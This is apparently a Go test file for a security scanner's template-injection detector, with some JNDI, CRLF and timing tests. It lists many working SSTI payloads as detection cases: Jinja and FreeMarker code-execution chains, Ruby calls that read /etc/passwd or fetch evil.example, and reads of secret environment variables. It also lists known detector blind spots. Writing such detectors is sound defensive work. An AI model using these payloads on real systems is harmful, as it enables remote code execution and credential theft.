		"fake {{name|email|password|...}}",
		"tar {{[-c|--create]}} {{[-f|--file]}} {{path/to/target.tar}}",
		// A short i18n call with a plain key.
		"${t('cart.title')}",
		`${t("checkout.submit")}`,
		"${t('Save changes')}",
		"${$t('nav.home')}",
		"${i18n.t('order.status-shipped')}",
		"${t('auth.password.label')}",
		"${t('session.expired')}",
		"Total: ${t('cart.total')} ${order.total}",
		// pass is a word ("bus pass", "boarding pass").
		"${bus.pass}",
		"${ticket.pass}",
		// #{ }: a plain data path is not code.
		"#{order.total}",
		"Order #{order.id} ready",
		"#{user.name}",
		"#{price}",
		// ?new or ?api after a quote in prose is not a FreeMarker binding.
		`He said "hi"?new(ish)`,
		`"x"?api`,
		"Is it 'new'?api docs",
	})
	assertHits(t, "SSTI", SSTI, want, []string{
		"{{7*7}}",
		"{{config|attr('__class__')}}",
		"{{ ''.__class__.__mro__ }}",
		"{{ cycler.__init__.__globals__.os.popen('id').read() }}",
		"{{ request|attr('application') }}",
		"${7*7}",
		"${user.password}",
		`${"id".execute()}`,
		"#{7*7}",
		"#{T(java.lang.Runtime).getRuntime()}",
		// Pipe counter-cases: call-shaped, sensitive or non-path roots and
		// filters, a second expression after a cleared one, odd spacing.
		"{{ x | safe }}",
		"{{ value|e }}",
		"<dd>{{ value|e }}</dd>",
		"{{ name|raw }}",
		"{{ name|escape }}",
		"{{ config|list }}",
		"{{ config | upper }}",
		"{{ self|string }}",
		"{{ request.args.x | upper }}",
		"{{ _self|upper }}",
		"{{ cycler|upper }}",
		"{{ lipsum|string }}",
		"{{ user.password | upper }}",
		"{{ secret|upper }}",
		"{{ name|title }}{{7*7}}",
		"{{ name|title }} {{ config.items() }}",
		"{{ name | title(1) }}",
		"{{ name|truncate (20) }}",
		"{{ name|join(',') }}",
		"{{ name|format('%s') }}",
		"{{['id']|filter('system')}}",
		"{{ ['id']|map('system')|join }}",
		"{{ name | date:'Y' }}",
		"{{364|add:733}}",
		"{{ 7|upper }}",
		"{{ 'a'|upper }}",
		"{{ \"a\"|upper }}",
		"{{ user['name']|upper }}",
		"{{ name ~ 'x' | upper }}",
		"{{ name + 1 | upper }}",
		"{{ .Name | html }}",
		"{{ name | }}",
		"{{ | upper }}",
		"{{ name || upper }}",
		"{{ request|attr(request.args.f|format(request.args.a)) }}",
		"{{app.request.server.all|join(',')}}",
		"{{ x | e('html') }}",
		"{{ name|title }}\n{{ self }}",
		"{{ 7|int }}",
		"{{ name|title if config else x }}",
		"{{ name | upper and request }}",
		"{{ a|b,c }}",
		"{{ a|b:c }}",
		"{{ a|b@c }}",
		"{{ .Name|html }}",
		"{{ x|y }}{{ .Env }}",
		"{{ x|safe|upper }}",
		"{{ name|Safe }}",
		"{{ REQUEST|upper }}",
		"{{ x | y !z }}",
		"{{ x | y\\z }}",
		"{{ x | y#z }}",
		"{{ [x]|list +config|dictsort }}",
		"{{ [x]|list -config|dictsort }}",
		"{{ x|upper if config else y }}",
		"{{ app.request.server.all|join }}",
		"{{ x|upper +request.environ|list }}",
		"{{ --config|list }}",
		// tldr alternation counter-cases.
		"{{[config|list]}}",
		"{{['id'|e]}}",
		"{{[-p|--patch()]}}",
		"{{[-p|]}}",
		"{{[|-p]}}",
		"{{[a|b].__class__}}",
		"{{[request|e]}}",
		// i18n counter-cases: a sensitive key, a longer root, a second
		// expression, a member or call after the call, a non-literal
		// argument, FreeMarker ?new.
		"${t('java.lang.Runtime')}",
		"${t('freemarker.template.utility.Execute')}",
		"${t('x').getClass()}",
		"${t('id').execute()}",
		"${t('a')}${ex('id')}",
		"${t('a') + \"id\".execute()}",
		"${t('a'+'b')}",
		"${t('a', 'b')}",
		"${t(\"a'b\")}",
		"${t('a\\'b')}",
		"${tt('id')}",
		"${ex('id')}",
		"${T('java.lang.Runtime')}",
		"${t('a').t('b')}",
		"<#assign t = \"freemarker.template.utility.Execute\"?new()>${t(\"id\")}",
		"[#assign t='freemarker.template.utility.Execute'?new()]${t('id')}",
		// pass is gone; the other credential names stay.
		"${user.password}",
		"${user.passwd}",
		"${user.pwd}",
		// #{ } counter-cases.
		"#{ 7 * 7 }",
		"#{3*3}",
		"#{runtime.exec('id')}",
		"#{session.getAttribute(\"rtc\").getRuntime()}",
		"#{process.binding(foo).spawn(foo2)}",
		"#{require.main.constructor._load(foo).readdirSync(foo2)}",
		`#{"freemarker.template.utility.Execute"?new()("id")}`,
		"#{T(Runtime)}",
		"#{user.password}",
		"#{''.class.forName('x')}",
		"#{system(params[:cmd])}",
		"#{%x(id)}",
		"#{%x[id]}",
		"#{File.read(x)}",
		"#{IO.popen(x)}",
		"#{Kernel.exec(x)}",
		"#{Dir.entries(x)}",
		"#{exec(x)}",
		"#{order.total}#{7*7}",
		"#{7*'7'}",
		"${7*'7'}",
		"#{open(%q(|id))}",
		// Jinja balances braces in an expression: the call runs before an
		// inner {{ }} set literal fails.
		"{{ lipsum.__globals__.os.popen('id').read() ~ {{a|b}} }}",
		"{{ cycler.x('id') ~ {{ name|title }} }}",
		// A FreeMarker binding of a class name anywhere in the value.
		`<#assign ex = "freemarker.template.utility.Execute"?new()>`,
		`<#assign x="freemarker.template.utility.ObjectConstructor"?NEW()>`,
	})
}

// TestSSTIAlpha6FixRound1 covers the review findings on the alpha.6
// template readings: operators inside a filter token, more template
// globals, Ruby "::" in #{ }, FreeMarker bindings that do not start with a
// literal, and the Node/Ruby/JSF names counted only where they reach code.
func TestSSTIAlpha6FixRound1(t *testing.T) {
	want := Hit{RuleID: "AEG-SSTI-001", Category: model.CatSSTI, Severity: model.SeverityHigh}
	assertHits(t, "SSTI", SSTI, want, []string{
		// I1: only the leading name of a filter token is exempt.
		"{{ x|raw??app.request.server.all|join }}",
		"{{ x|first??app.request.server.all|join }}",
		"{{ x|length<config.SECRET_KEY|length }}",
		"{{ x|first==config.SECRET_KEY[0] }}",
		"{{ x|e[config] }}",
		"{{ x|list-config|dictsort }}",
		"{{ x|list/config }}",
		"{{ x|list>request.environ }}",
		"{{ x|title.config }}",
		// I1: more template globals.
		"{{ _context|json_encode }}",
		"{{ _context|keys|join }}",
		"{{ g|list }}",
		"{{[g|get]}}",
		"{{ ansible_env|to_nice_json }}",
		"{{ hostvars|to_json }}",
		// I2: Ruby "::" constant paths in #{ }.
		"#{Kernel::system('id')}",
		"#{::Kernel.system('id')}",
		"#{Open3::capture2('id')}",
		"#{File::read('/etc/passwd')}",
		"#{::File.read('/etc/passwd')}",
		"#{Net::HTTP.get(URI('http://evil.example/'))}",
		"#{Open3::capture2(x)}",
		"#{Kernel::open(x)}",
		// I3: FreeMarker bindings that do not start with a literal.
		`<#assign e=("freemarker.template.utility."+"Execute")?new()>${e("id")}`,
		`<#assign c="freemarker.template.utility.Execute"><#assign e=c?new()>${e("id")}`,
		"[#assign e=c?new()]${e('id')}",
		"<#assign e=x?api>${e('id')}",
		"<#assign e=c?new ()>${e('id')}",
		`<#assign e="freemarker.template.utility.Execute" ? new()>${e("id")}`,
		"<#assign e=c?NEW()>${t('id')}",
		// I4: the code-reaching shapes of the Node/Ruby names stay caught.
		"#{require.main.constructor._load(foo).readdirSync(foo2)}",
		"#{require.main.constructor._load(foo)}",
		"#{process.binding(foo).spawn(foo2)}",
		"#{binding.irb}",
		"${binding.eval(x)}",
		"#{x.constructor.constructor(x)()}",
		"#{this.constructor.constructor(x)()}",
		"#{require(x)}",
		"#{spawn(x)}",
		"#{instance_eval(x)}",
		"#{Kernel.open(x)}",
		"#{ObjectSpace.each_object(x)}",
		"#{File.read(x)}",
		"#{IO.readlines(x)}",
		"#{Dir.entries(x)}",
		"#{Dir.glob(x)}",
		// I5: indexes on ENV, Dir and JSF implicit objects; dynamic calls.
		"#{ENV['SECRET_KEY_BASE']}",
		"#{ENV[x]}",
		"#{Dir['/*']}",
		"#{header['x']}",
		"#{sessionScope['user']}",
		"#{applicationScope['x']}",
		"#{initParam['db']}",
		"#{new ProcessBuilder(x).start()}",
		"#{new ProcessBuilder({'id'}).start()}",
		"#{Function(x)()}",
		"#{new Function(x)()}",
		"#{x.send(m, a)}",
		"#{x.public_send(m)}",
		"#{x.__send__(m)}",
		"#{Object.const_get(m).new}",
		"#{beanFactory.getBean(x)}",
		"#{facesContext.externalContext.sessionMap}",
		"#{facesContext.externalContext}",
		"#{sessionScope.user}",
		// Self-attack of the position rules: operators after a filter name,
		// blanks before "(" "." "[", bracket access, Function, ENV and Dir.
		"{{ x|e?config }}",
		"{{ x|e<-config }}",
		"{{ x|raw??g }}",
		"{{ x|first[request] }}",
		"{{ x|join>_context }}",
		"#{x.send (m)}",
		"#{Kernel .open(x)}",
		"#{Kernel\n.open(x)}",
		"#{Open3 . capture2(x)}",
		"#{Object::Kernel.open(x)}",
		"#{ENV ['x']}",
		"#{ENV.to_h}",
		"#{Dir.pwd}",
		"#{x['constructor']['constructor'](y)()}",
		"#{x.constructor .constructor(y)()}",
		"#{Function.call(null, x)}",
		"#{Function ('x')()}",
		"#{beanFactory.getBean (x)}",
		"<#assign e=c?API>${e('id')}",
		"<#assign e=c?\nnew()>${e('id')}",
	})
	assertNoHits(t, "SSTI", SSTI, []string{
		// I1: tldr forms keep passing.
		"git stash {{[-p|--patch]}}",
		"tar {{[-o|--output-dir]}} {{[-c|--config]}}",
		"kubectl {{[c|config]}} {{b|k|m|g}}",
		"{{ user.name | upper }}",
		// I3: prose ?new outside ${ } stays clean, and an i18n call stays
		// clean when the value holds no ?new or ?api.
		`He said "hi"?new(ish)`,
		"${t('cart.title')}",
		"${t('cart.title')} - what?news",
		// I4: plain field names.
		"${repo.fork}",
		"Repo ${repo.fork} has ${repo.stars} stars",
		"${book.binding}",
		"${product.binding.type}",
		"Binding: ${book.binding}, pages ${book.pages}",
		"${device.kernel}",
		"${os.kernel.version}",
		"${popcorn.kernel}",
		"${npc.spawn}",
		"${user.constructor}",
		"${form.require}",
		"${File.separator}",
		"src${File.separator}main",
		"${IO.speed}",
		"${Dir.name}",
		"#{repo.fork}",
		"#{book.binding}",
		"${order.send}",
		"${mail.function}",
		"${page.header}",
		"${env_name}",
		"${item.require.label}",
		"${weights['g']}",
		"${row['name']}",
		"${binding.type}",
		"${user.constructor.name}",
		"${Function}",
		"${page.header['x']}",
		"#{a ? b : c}",
		"Order #{id: 5}",
	})
}

// TestSSTIAlpha6FixRound2 covers the inverted #{ } reading (only a plain
// data path is clear; everything 8ad8880 flagged in #{ } stays flagged), the
// FreeMarker directive and built-in guard on the i18n reading, and ${ }
// back at the 8ad8880 rules apart from pass, i18n calls and quoted numbers.
func TestSSTIAlpha6FixRound2(t *testing.T) {
	want := Hit{RuleID: "AEG-SSTI-001", Category: model.CatSSTI, Severity: model.SeverityHigh}
	assertHits(t, "SSTI", SSTI, want, []string{
		// N1: a blank before "(".
		`#{system ("id")}`,
		"#{system ('cat /etc/passwd')}",
		"#{exec ('id')}",
		"#{open ('|id')}",
		"#{eval (params[:c])}",
		// N2: "&." and wrapped receivers.
		"#{Kernel&.open(params[:c])}",
		"#{File&.read(params[:f])}",
		"#{Dir&.glob(x)}",
		"#{Open3&.capture2(x)}",
		"#{ObjectSpace&.each_object(x)}",
		"#{ENV&.to_h}",
		"#{(Kernel).open(params[:c])}",
		"#{(File).read(params[:f])}",
		"#{[Kernel][0].open(x)}",
		"#{(ENV)['SECRET_KEY_BASE']}",
		"#{(Dir)['/*']}",
		"#{ENV.[](x)}",
		"#{Dir.[]('/*')}",
		// N3: method objects.
		"#{method(:spawn).call(params[:c])}",
		"#{method(:fork).call}",
		"#{x.method(:instance_eval).call(y)}",
		"#{x.public_method(:send).call(m, a)}",
		"#{x.method(:send).(m, a)}",
		// N4: FreeMarker ?eval, a variable, a comment inside the built-in.
		`<#assign e=('"freemarker.template.utility.Execute"?n'+'ew()')?eval>${e('id')}`,
		"<#assign e=c?eval>${e('id')}",
		"<#assign e=c?new<#-- -->()>${e('id')}",
		"<#assign e=c?interpret>${e('id')}",
		"<@x/>${e('id')}",
		"[@x/]${e('id')}",
		"[#assign e=c]${e('id')}",
		"<#assign e=c? eval>${e('id')}",
		// N5: optional calls, comments, template-literal keys, Function by
		// reference.
		"#{x?.constructor?.constructor?.(y)()}",
		"#{require?.(x)}",
		"#{require/**/(x)}",
		"#{require /*c*/ (x)}",
		"#{x.constructor[`constructor`](y)()}",
		"#{x[`constructor`][`constructor`](`return 1`)()}",
		"#{(0,Function)(y)()}",
		"#{Reflect.construct(Function,[y])()}",
		// Related: Spring environment and property maps, concatenated keys.
		"#{systemEnvironment['DB_PASSWORD']}",
		"#{@systemEnvironment['x']}",
		"#{systemProperties['user.home']}",
		"#{x['constru'+'ctor']['constru'+'ctor']('return 1')()}",
		// Plain paths that are not benign: a module, environment or scope
		// root, a sensitive segment, a zero-argument code method.
		"#{binding.irb}",
		"#{Kernel.exit}",
		"#{ENV.keys}",
		"#{Process.pid}",
		"#{Dir.pwd}",
		"#{File.separator}",
		"#{header.title}",
		"#{sessionScope.user}",
		"#{viewScope.user}",
		"#{flowScope.order}",
		"#{conversationScope.cart}",
		"#{conversation.id}",
		"#{cc.attrs.x}",
		"#{component.id}",
		"#{resource.x}",
		"#{pageScope.x}",
		"#{requestScope.x}",
		"#{applicationScope.x}",
		"#{pageContext.request}",
		"#{request.x}",
		"#{session.x}",
		"#{facesContext.externalContext}",
		"#{systemProperties.x}",
		"#{user.password}",
		"#{config.secret}",
		"#{x.instance_variables}",
		"#{self.methods}",
		"#{x.irb}",
		"#{x.constructor}",
		"#{a.getClass}",
		"#{x.y.classLoader}",
		// Gains kept: quoted product, %x, #{T(.
		"#{7*'7'}",
		"#{%x{id}}",
		"#{T(Runtime)}",
		"#{amount(usd)}",
		"#{x[0]}",
		"#{a*b}",
		"#{foo(bar)}",
		"#{x.send m}",
		"#{File.expand_path(x)}",
		"#{t('cart.title')}",
	})
	assertNoHits(t, "SSTI", SSTI, []string{
		// Required clean in #{ }.
		"#{order.total}",
		"#{user.name}",
		"#{order.id}",
		"#{repo.fork}",
		"#{book.binding}",
		"#{user.pass}",
		"#{bus.pass}",
		" #{ order.total } ",
		"Order #{12}",
		"Flat #{3B}",
		// N6: ${ } is back at the 8ad8880 rules.
		"${Kernel.version}",
		"${Dir.home}",
		"${File.open}",
		"${header['title']}",
		`${row["token"]}`,
		"${user.send()}",
		"${fork (2)}",
		"${f%x*}",
		"${name%x.*}",
		// i18n stays clean with no FreeMarker directive or built-in.
		"${t('cart.title')} - what?news",
		"${t('cart.title')} <b>#1</b>",
	})
}

// TestSSTIAlpha6AcceptedMisses pins the attack shapes alpha.6 lets through
// to clear the template text above (threat model, "Changes in alpha.6";
// corpus README trade-off section). If one starts to hit, update those
// documents.
func TestSSTIAlpha6AcceptedMisses(t *testing.T) {
	assertNoHits(t, "SSTI", SSTI, []string{
		// 1. A {{ }} filter pipe made only of placeholder text.
		"{{ name|upper }}",
		"{{ x|list }}",
		"{{ x|attr }}",
		"{{ x|config }}",
		"{{ name|system }}",
		"{{[a|b]}}",
		"{{[a|b][0]}}",
		"{{ x|y if a else b }}",
		"{{[x|safe]}}",
		"{{[c|config]}}",
		"{{ -g|list }}",
		// 2. In ${ }, a one-letter, $t or i18n.t call with one plain string
		// literal, when the name was bound to an executor outside the value
		// and the value holds no FreeMarker directive or binding built-in.
		"${e('id')}",
		"${t('whoami')}",
		// 3. pass as a member or a call in ${ }, and a #{ } data path
		// ending in pass.
		"${user.pass}",
		"${user.pass()}",
		"#{user.pass}",
		// 4. #{ } holding a plain data path that reaches a zero-argument
		// method not in hashCodeSegments.
		"#{x.fork}",
		"#{x.class}",
		"#{a.b.c}",
		"#{order.send}",
		"#{file.read}",
	})
}

func TestJNDIPositives(t *testing.T) {
	want := Hit{RuleID: "AEG-JNDI-001", Category: model.CatJNDI, Severity: model.SeverityCritical}
	assertHits(t, "JNDI", JNDI, want, jndiPositives)
}

func TestJNDINegatives(t *testing.T) {
	assertNoHits(t, "JNDI", JNDI, jndiNegatives)
}

func TestCRLFPositives(t *testing.T) {
	want := Hit{RuleID: "AEG-CRLF-001", Category: model.CatCRLF, Severity: model.SeverityHigh}
	assertHits(t, "CRLF", CRLF, want, crlfPositives)
}

func TestCRLFNegatives(t *testing.T) {
	assertNoHits(t, "CRLF", CRLF, crlfNegatives)
}

// TestInjectionAdversarialTime checks the scanners stay linear on long
// repetitions of their own trigger sequences.
func TestInjectionAdversarialTime(t *testing.T) {
	inputs := map[string]string{
		"cmdi":   strings.Repeat("; id x", 1400),
		"ldap":   strings.Repeat(")(", 4096),
		"ssti":   strings.Repeat("{{", 4096),
		"ssti2":  strings.Repeat("{{ a ", 1600) + "}}",
		"ssti3":  strings.Repeat("{%", 4096),
		"ssti4":  strings.Repeat("#{", 4096),
		"jndi":   strings.Repeat("${::-", 1600) + strings.Repeat("a", 512) + strings.Repeat("}", 1600),
		"jndi2":  strings.Repeat("${", 4096),
		"jndi3":  strings.Repeat("${a", 1365) + strings.Repeat("}", 1365),
		"quotes": "; cat " + strings.Repeat("'", 8192),
		"cmdi2":  strings.Repeat("|", 8192),
		"shock":  strings.Repeat("() {", 2048),
		"crlf":   strings.Repeat("\r\n", 4096),
		"codei":  strings.Repeat("<?eval(", 1170),
		// alpha.6 prose readings: backtick spans, UA comments, prose lines.
		"ticks":   strings.Repeat("a `", 2730),
		"ticks2":  "a `" + strings.Repeat("x ", 4096),
		"uacmt":   "Mozilla/5.0 (" + strings.Repeat("U; id; ", 1170),
		"proseln": strings.Repeat("Dear team\n", 819),
		// alpha.6 substitution and echo rules.
		"subst":  strings.Repeat("$(", 4096),
		"subst2": "$(" + strings.Repeat("a ", 4096),
		"subst3": strings.Repeat("$((1", 2048),
		"subst4": strings.Repeat("x $(a", 1638),
		"subst5": "$(a" + strings.Repeat(" ", 8192),
		"subst6": strings.Repeat("$(a ", 2048),
		"echo":   strings.Repeat(";echo ", 1365),
	}
	fns := []func(string) (Hit, bool){CmdI, cmdIQuery, CodeI, LDAP, SSTI, JNDI, CRLF}
	if testing.Short() {
		t.Skip("wall-clock bound; skipped under -short")
	}
	// At most 120 µs each even at load average 59. A quadratic scan of
	// 8 KiB costs tens of milliseconds, which the catastrophic bound still
	// catches.
	lim := wallLimit(2*time.Millisecond, 20*time.Millisecond)
	for name, in := range inputs {
		for _, fn := range fns {
			if d := bestOf(3, func() { fn(in) }); d > lim {
				t.Errorf("%s: %v on %d bytes, want under %v", name, d, len(in), lim)
			}
		}
	}
}

// TestCmdIProseSemicolonLinear: the prose-sentence check before "; " must
// not rescan the value from its start for every semicolon. A long
// blank-free prefix followed by many "; a" was quadratic (1 MiB: 27 s).
func TestCmdIProseSemicolonLinear(t *testing.T) {
	if testing.Short() {
		t.Skip("wall-clock bound; skipped under -short")
	}
	shape := func(n int) string { return strings.Repeat("x", n/2) + strings.Repeat("; a", n/6) }
	s, m, l := shape(64<<10), shape(256<<10), shape(1<<20)
	// Growth ratio, measured within this run on this machine: it must be
	// over 8x for four times the input three times in a row to count, so
	// load spikes do not trip it.
	if raceSlowdown == 1 && cmdISuperLinear(s, m) && cmdISuperLinear(s, m) && cmdISuperLinear(s, m) {
		t.Errorf("CmdI on %d bytes took over 8x its time on %d bytes three times: super-linear", len(m), len(s))
	}
	// The quadratic regression took 27 s on 1 MiB.
	if lim := wallLimit(100*time.Millisecond, 2*time.Second); bestOf(3, func() { CmdI(l) }) > lim {
		t.Errorf("CmdI on %d bytes took over %v", len(l), lim)
	}
	if lim := wallLimit(500*time.Millisecond, 10*time.Second); bestOf(3, func() { ScanText(l) }) > lim {
		t.Errorf("ScanText on %d bytes took over %v", len(l), lim)
	}
}

// cmdISuperLinear reports whether CmdI on m (four times the length of s)
// took more than eight times as long as on s, best of three runs each. Runs
// on s under 200µs are too fast to time reliably and never count.
func cmdISuperLinear(s, m string) bool {
	ds := bestOf(3, func() { CmdI(s) })
	dm := bestOf(3, func() { CmdI(m) })
	return ds > 200*time.Microsecond && dm > 8*ds
}

// TestJNDILargePayloadTime checks nested lookups around a large payload:
// resolving moves the payload up one level per close, so the cost is
// bounded by the depth cap times the length.
func TestJNDILargePayloadTime(t *testing.T) {
	sizes := []int{64 << 10, 1 << 20}
	if testing.Short() {
		sizes = nil // wall-clock bound; skipped under -short
	}
	// About 3 ms at 1 MiB even at load average 59. Unbounded nested
	// resolution would cost the depth times the length: seconds.
	lim := wallLimit(10*time.Millisecond, 200*time.Millisecond)
	for _, size := range sizes {
		payload := strings.Repeat("a", size)
		for _, depth := range []int{maxLookupDepth, 1000} {
			for _, open := range []string{"${lower:", "${upper:", "${x:-", "${::-"} {
				in := strings.Repeat(open, depth) + payload + strings.Repeat("}", depth)
				if d := bestOf(3, func() { JNDI(in) }); d > lim {
					t.Errorf("JNDI(%q x %d around %d bytes): %v, want under %v", open, depth, size, d, lim)
				}
			}
		}
	}
	// One level past the cap is reported, not resolved.
	deep := strings.Repeat("${x:-", maxLookupDepth+1) + "a" + strings.Repeat("}", maxLookupDepth+1)
	if _, ok := JNDI(deep); !ok {
		t.Errorf("JNDI on %d nested lookups = no hit, want hit", maxLookupDepth+1)
	}
	if _, ok := JNDI(strings.Repeat("${x:-", maxLookupDepth) + "a" + strings.Repeat("}", maxLookupDepth)); ok {
		t.Errorf("JNDI on %d nested lookups without jndi = hit, want none", maxLookupDepth)
	}
}

// bestOf returns the fastest of n runs of f, to keep scheduler noise out of
// timing assertions.
func bestOf(n int, f func()) time.Duration {
	best := time.Duration(1<<63 - 1)
	for range n {
		start := time.Now()
		f()
		if d := time.Since(start); d < best {
			best = d
		}
	}
	return best
}
